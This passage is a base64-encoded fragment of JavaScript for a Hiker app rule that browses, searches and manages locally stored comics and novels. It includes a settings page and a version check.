ge1xcbiAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxuICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFwiO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcIjtcXG4gICAgICAgIH1cXG4gICAgfSwgcGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFtcXFwi55yL5ryr55S7XFxcIiwgXFxcIuWIoOmZpOeroOiKglxcXCJdW21vZGVdLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKG1vZGUpID0+IHtcXG4gICAgICAgIHB1dE15VmFyKFxcXCIubW9kZVxcXCIsIG1vZGUgPT09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIik7XFxuICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgfSwgbW9kZSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbn0pXFxubGV0IG1obGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCwgXFxcImRpclxcXCIpO1xcbm1obGlzdC5zb3J0KChhLCBiKSA9PiB7XFxuICAgIGEgPSAoYS5uYW1lLm1hdGNoKC9cXFxcZCsvKSB8fCBbXSlbMF0gfHwgMDtcXG4gICAgYiA9IChiLm5hbWUubWF0Y2goL1xcXFxkKy8pIHx8IFtdKVswXSB8fCAwO1xcbiAgICByZXR1cm4gYSAtIGI7XFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwi56ug6IqCIFxcXCIuYmlnKCkgKyAoXFxcIuWFseaciTpcXFwiICsgbWhsaXN0Lmxlbmd0aCArIFxcXCLnq6BcXFwiKS5zbWFsbCgpLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGlzUmV2ZXJzZSkgPT4ge1xcbiAgICAgICAgcHV0TXlWYXIoXFxcIi5pc1JldmVyc2VcXFwiLCBpc1JldmVyc2UgPT09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIik7XFxuICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgfSwgaXNSZXZlcnNlKSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGV0IGFycmF5ID0gW107XFxuXFxuaWYgKG1vZGUgPT09IFxcXCIwXFxcIikge1xcbiAgICBpZiAoQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSA9PT0gXFxcIjBcXFwiKSB7XFxuICAgICAgICBsZXQgbGF6eSA9ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuICAgICAgICAgICAgbGV0IGZpbGVsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChpbnB1dCk7XFxuICAgICAgICAgICAgbGV0IHNob3J0ZW4gPSBpbnB1dC5yZXBsYWNlKGdldFBhdGgoXFxcImhpa2VyOi8vZmlsZXMvXFxcIikuc2xpY2UoNyksIFxcXCJoaWtlcjovL2ZpbGVzL1xcXCIpO1xcbiAgICAgICAgICAgIGxldCBwaWNsaXN0ID0gZmlsZWxpc3QubWFwKChpdGVtLCBpKSA9PiBzaG9ydGVuICsgXFxcIi9cXFwiICsgKGkgKyAxKSArIFxcXCIuanBnXFxcIik7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJwaWNzOi8vXFxcIiArIHBpY2xpc3Quam9pbihcXFwiJiZcXFwiKTtcXG4gICAgICAgIH0pO1xcbiAgICAgICAgZm9yIChsZXQgaXRlbSBvZiBtaGxpc3QpIHtcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSBnZXRUaXRsZShpdGVtLm5hbWUpO1xcbiAgICAgICAgICAgIGFycmF5LnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxuICAgICAgICAgICAgICAgIHVybDogaXRlbS5wYXRoICsgbGF6eSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IENvbmZpZy5kZWZfQ29taWNfU3R5bGUsXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IGl0ZW0ucGF0aCArIFxcXCIvMS5qcGdcXFwiXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBmb3IgKGxldCBpdGVtIG9mIG1obGlzdCkge1xcbiAgICAgICAgICAgIGxldCB0aXRsZSA9IGdldFRpdGxlKGl0ZW0ubmFtZSk7XFxuICAgICAgICAgICAgYXJyYXkucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2NvbWljQ29tcGF0aWJsZS52aWV3I2F1dG9QYWdlIyNyZWFkVGhlbWUjP3BhdGg9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpdGVtLnBhdGgpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogQ29uZmlnLmRlZl9Db21pY19TdHlsZSxcXG4gICAgICAgICAgICAgICAgcGljX3VybDogaXRlbS5wYXRoICsgXFxcIi8xLmpwZ1xcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBwYXRoOiBpdGVtLnBhdGgsXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogZ2V0VGl0bGUyKGl0ZW0ubmFtZSlcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuXFxufSBlbHNlIHtcXG4gICAgZm9yIChsZXQgaXRlbSBvZiBtaGxpc3QpIHtcXG4gICAgICAgIGxldCBuYW1lID0gZ2V0VGl0bGUyKGl0ZW0ubmFtZSk7XFxuICAgICAgICBhcnJheS5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogbmFtZSxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIuehruiupOWIoOmZpFtcXFwiICsgbmFtZSArIFxcXCJd77yfXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liKDpmaTlpLHotKVcXFwiO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSwgaXRlbS5wYXRoKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogQ29uZmlnLmRlZl9Db21pY19TdHlsZSxcXG4gICAgICAgICAgICBwaWNfdXJsOiBpdGVtLnBhdGggKyBcXFwiLzEuanBnXFxcIlxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59XFxuaWYgKGlzUmV2ZXJzZSA9PT0gXFxcIjFcXFwiKSB7XFxuICAgIGFycmF5LnJldmVyc2UoKTtcXG59XFxubGF5b3V0LnB1c2guYXBwbHkobGF5b3V0LCBhcnJheSk7XFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi7ogZrlkIjmkJzntKJcIixcInBhdGhcIjpcIlNlYXJjaC52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qcz9ydWxlPVxcXCIgKyBNWV9SVUxFLl90aXRsZSk7XFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzP3J1bGU9XFxcIiArIE1ZX1JVTEUuX3RpdGxlKTtcXG5sZXQgY29taWNSdWxlRGlycyA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnW2dldFBhcmFtKFxcXCJ0eXBlXFxcIikgKyBcXFwiUGF0aFxcXCJdLCBcXFwiZGlyXFxcIik7XFxuaWYgKGdldFBhcmFtKFxcXCJpc0FsbFxcXCIpID09PSBcXFwiMVxcXCIpIHtcXG4gICAgY29taWNSdWxlRGlycyA9IGNvbWljUnVsZURpcnMuZmlsdGVyKGl0ZW0gPT4gaXRlbS5uYW1lID09PSBNWV9SVUxFLnRpdGxlKTtcXG59XFxuXFxubGV0IHNlYXJjaFJlc3VsdCA9IFtdO1xcbmxldCBzZWFyY2hUZXJtcz0gZ2V0UGFyYW0oXFxcInNlYXJjaFRlcm1zXFxcIik7XFxubGV0IHNlYXJjaFRlc3Q7XFxuXFxuaWYgKCFnZXRTZWFyY2hNb2RlKCkpIHtcXG4gICAgbGV0IHRlcm1zQXJyID0gc2VhcmNoVGVybXMuc3BsaXQoXFxcIlxcXCIpLm1hcCh0ID0+IHQucmVwbGFjZSgvXFxcXCp8XFxcXC58XFxcXD98XFxcXCt8XFxcXCR8XFxcXF58XFxcXFt8XFxcXF18XFxcXCh8XFxcXCl8XFxcXHt8XFxcXH18XFxcXHx8XFxcXC98XFxcXFxcXFwvZywgayA9PiBcXFwiXFxcXFxcXFxcXFwiICsgaykpO1xcbiAgICBsZXQgcmVnID0gbmV3IFJlZ0V4cCh0ZXJtc0Fyci5qb2luKFxcXCIuKlxcXCIpLCBcXFwiaVxcXCIpO1xcbiAgICBzZWFyY2hUZXN0ID0gdGV4dCA9PiByZWcudGVzdCh0ZXh0KTtcXG59IGVsc2Uge1xcbiAgICBzZWFyY2hUZXN0ID0gdGV4dCA9PiBzZWFyY2hDb250YWlucyh0ZXh0LCBzZWFyY2hUZXJtcywgZmFsc2UpO1xcbn1cXG5cXG5sZXQgcGFnZVVybCA9IGdldFBhcmFtKFxcXCJ0eXBlXFxcIikgPT09IFxcXCJub3ZlbFxcXCIgPyBcXFwiaGlrZXI6Ly9wYWdlL05vdmVsQnJvd3Nlci52aWV3XFxcIiA6IFxcXCJoaWtlcjovL3BhZ2UvQ29taWNCcm93c2VyLnZpZXdcXFwiO1xcbmZvciAobGV0IHNvbkRpciBvZiBjb21pY1J1bGVEaXJzKSB7XFxuICAgIGxldCBjb21pY0xpc3QgPSBGaWxlLmdldEZpbGVQYXRoKHNvbkRpci5wYXRoLCBcXFwiZGlyXFxcIik7XFxuICAgIGZvciAobGV0IGNvbWljIG9mIGNvbWljTGlzdCkge1xcbiAgICAgICAgaWYgKHNlYXJjaFRlc3QoY29taWMubmFtZSkpIHtcXG4gICAgICAgICAgICBzZWFyY2hSZXN1bHQucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBjb21pYy5uYW1lLFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBjb21pYy5wYXRoICsgXFxcIi9cXFwiICsgY29taWMubmFtZSArIFxcXCIuanBnXFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiBwYWdlVXJsICsgXFxcIj9ydWxlPVxcXCIgKyBNWV9SVUxFLl90aXRsZSxcXG4gICAgICAgICAgICAgICAgZGVzYzogc29uRGlyLm5hbWUsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiBjb21pY1xcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuXFxufVxcbnNldFJlc3VsdChzZWFyY2hSZXN1bHQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3Yu6K6+572uXCIsXCJwYXRoXCI6XCJTZXR0aW5nLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbnNldFBhZ2VUaXRsZShNWV9SVUxFLnRpdGxlICsgXFxcInzorr7nva5cXFwiKTtcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFwiKTtcXG5cXG5sZXQgbGF5b3V0ID0gW107XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIjxzdHJvbmc+5Z+656GA6K6+572uPC9zdHJvbmc+XFxcIi5iaWcoKSxcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuebruW9lei3r+W+hFxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nL01vcmUudmlldyNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9zZXR0aW5nVHlwZT1jb250ZW50c1xcXCIsXFxuICAgIGRlc2M6IENvbmZpZy5ob21lUGF0aCxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuiuvue9rum7mOiupOWwgemdolxcXCIsXFxuICAgIGRlc2M6IENvbmZpZy5kZWZfUGljLFxcbiAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy9Nb3JlLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/c2V0dGluZ1R5cGU9ZGVmYXVsdFBpY1xcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICB9XFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIjxzdHJvbmc+5LiL6L295Zmo6K6+572uPC9zdHJvbmc+XFxcIi5iaWcoKSxcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxuXFxuZnVuY3Rpb24gc2V0TnVtKGtleSwgdGVzdCkge1xcbiAgICBsZXQgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCAwKSB8fCBcXFwie31cXFwiKTtcXG4gICAgaW5wdXQgPSBwYXJzZUludChpbnB1dCk7XFxuICAgIGlmIChOdW1iZXIuaXNOYU4oaW5wdXQpKSByZXR1cm4gXFxcInRvYXN0Oi8v6K+36L6T5YWl5pWw5a2XXFxcIjtcXG4gICAgaWYgKCF0ZXN0KGlucHV0KSkgcmV0dXJuIFxcXCJ0b2FzdDovL+S4jeespuWQiOadoeS7tlxcXCI7XFxuICAgIENvbmZpZ1trZXldID0gaW5wdXQ7XFxuICAgIHNhdmVGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcbiAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgIHJldHVybiBcXFwidG9hc3Q6Ly/kv67mlLnmiJDlip9cXFwiO1xcbn1cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwibG9n5pWwXFxcIixcXG4gICAgdXJsOiAkKENvbmZpZy5sb2dOdW0sIFxcXCIwPE48MTAwXFxcIikuaW5wdXQoc2V0TnVtLCBcXFwibG9nTnVtXFxcIiwgaXQgPT4gaXQgPiAwICYmIGl0IDwgMTAwKSxcXG4gICAgZGVzYzogXFxcIlxcXCIgKyBDb25maWcubG9nTnVtLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5YiG5om55LiL6L295pWwKDDkuI3lvIDlkK8pXFxcIixcXG4gICAgdXJsOiAkKFxcXCJcXFwiICsgQ29uZmlnLnRocmVhZE51bSwgXFxcIk4+LTFcXFwiKS5pbnB1dChzZXROdW0sIFxcXCJ0aHJlYWROdW1cXFwiLCBpdCA9PiBpdCA+IC0xKSxcXG4gICAgZGVzYzogXFxcIlxcXCIgKyBDb25maWcudGhyZWFkTnVtLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgIH1cXG59KTtcXG5cXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiPHN0cm9uZz7lsI/or7TpmIXor7vlmajorr7nva48L3N0cm9uZz5cXFwiLmJpZygpLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi6buY6K6k5byA5ZCv5YiG6aG16ZiF6K+7XFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChkZWZfaXNQYWdpbmF0ZSkgPT4ge1xcbiAgICAgICAgbGV0IENvbmZpZyA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgMCkgfHwgXFxcInt9XFxcIik7XFxuXFxuICAgICAgICBDb25maWcuZGVmX2lzUGFnaW5hdGUgPSBkZWZfaXNQYWdpbmF0ZSA9PT0gXFxcIjBcXFwiID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiO1xcblxcbiAgICAgICAgc2F2ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9LCBDb25maWcuZGVmX2lzUGFnaW5hdGUpLFxcbiAgICBkZXNjOiBDb25maWcuZGVmX2lzUGFnaW5hdGUgPT09IFxcXCIwXFxcIiA/IFxcXCLkuI3lvIDlkK9cXFwiIDogXFxcIuW8gOWQr1xcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmr4/pobXmnIDlpKfnq6DmlbBcXFwiLFxcbiAgICB1cmw6ICQoQ29uZmlnLnZpZXdQYWdlU2l6ZSwgXFxcIjMwPE48NTAwXFxcIikuaW5wdXQoc2V0TnVtLCBcXFwidmlld1BhZ2VTaXplXFxcIiwgaXQgPT4gaXQgPiAzMCAmJiBpdCA8IDUwMCksXFxuICAgIGRlc2M6IFxcXCJcXFwiICsgQ29uZmlnLnZpZXdQYWdlU2l6ZSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuabv+aNouinhOWImVxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nL01vcmUudmlldyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSMjbm9SZWZyZXNoIz9zZXR0aW5nVHlwZT1yZXBsYWNlUnVsZVxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICB9XFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIjxzdHJvbmc+5ryr55S76ZiF6K+75Zmo6K6+572uPC9zdHJvbmc+XFxcIi5iaWcoKSxcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuWFvOWuueaooeW8j1xcXCIsXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoZGVmX2lzQ29taWNDb21wYXRpYmxlKSA9PiB7XFxuICAgICAgICBsZXQgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCAwKSB8fCBcXFwie31cXFwiKTtcXG5cXG4gICAgICAgIENvbmZpZy5kZWZfaXNDb21pY0NvbXBhdGlibGUgPSBkZWZfaXNDb21pY0NvbXBhdGlibGUgPT09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIjtcXG5cXG4gICAgICAgIHNhdmVGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSksXFxuICAgIGRlc2M6IENvbmZpZy5kZWZfaXNDb21pY0NvbXBhdGlibGUgPT09IFxcXCIwXFxcIiA/IFxcXCLkuI3lvIDlkK9cXFwiIDogXFxcIuW8gOWQr1xcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmvKvnlLvliJfooajmoLflvI9cXFwiLFxcbiAgICB1cmw6ICQoW1xcXCJ0ZXh0XzFcXFwiLCBcXFwiYXZhdGFyXFxcIiwgXFxcInBpY18zXFxcIiwgXFxcInBpY18zX3NxdWFyZVxcXCIsIFxcXCJtb3ZpZV8zX21hcnF1ZWVcXFwiXSwgMSwgXFxcIuivt+mAieaLqea8q+eUu+WIl+ihqOaYvuekuuagt+W8j1xcXCIpLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICBsZXQgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCAwKSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgIENvbmZpZy5kZWZfQ29taWNfU3R5bGUgPSBpbnB1dDtcXG4gICAgICAgIHNhdmVGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgQ29uZmlnLmRlZl9Db21pY19TdHlsZSksXFxuICAgIGRlc2M6IENvbmZpZy5kZWZfQ29taWNfU3R5bGV8fFxcXCJcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiPHN0cm9uZz7lhbbku5borr7nva48L3N0cm9uZz5cXFwiLmJpZygpLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi6KeE5YiZ5Y+R5biD6aG1XFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVEZXRhaWwjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU96YGT6ZW/5LuT5bqTUHJvXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGx2ZXI6IE1ZX1BBUkFNUy52ZXJzaW9uIHx8IFxcXCLojrflj5bniYjmnKzlpLHotKXvvIzoh6rooYzmn6XnnItcXFwiLFxcbiAgICAgICAgaWQ6IFxcXCIzNTU5XFxcIlxcbiAgICB9LFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5oGi5aSN6buY6K6k6K6+572uXFxcIixcXG4gICAgdXJsOiAkKFxcXCLnoa7orqTmgaLlpI3pu5jorqTorr7nva7vvJ9cXFwiKS5jb25maXJtKCgpID0+IHtcXG4gICAgICAgIGRlbGV0ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIik7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5oGi5aSN5a6M5oiQXFxcIjtcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmuIXnkIbnvJPlrZhcXFwiLFxcbiAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy9Nb3JlLnZpZXcjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjP3NldHRpbmdUeXBlPWNhY2hlXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuaWh+S7tueuoeeQhlxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9GaWxlTWFuYWdlbWVudC52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGV0IHRpZCA9IERhdGUubm93KCk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuajgOa1i+abtOaWsFxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChvbGRWZXJzaW9uLCB0aWQpID0+IHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgbGV0IG5ld1ZlcnNpb24gPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9kZXYvZ2V0YnlpZD9pZD0zNTU5XFxcIiwge1xcbiAgICAgICAgICAgICAgICB0aW1lb3V0OiAyMDAwXFxuICAgICAgICAgICAgfSkpLnJlc3VsdC52ZXI7XFxuICAgICAgICAgICAgaWYgKG5ld1ZlcnNpb24gPD0gb2xkVmVyc2lvbikge1xcbiAgICAgICAgICAgICAgICB1cGRhdGV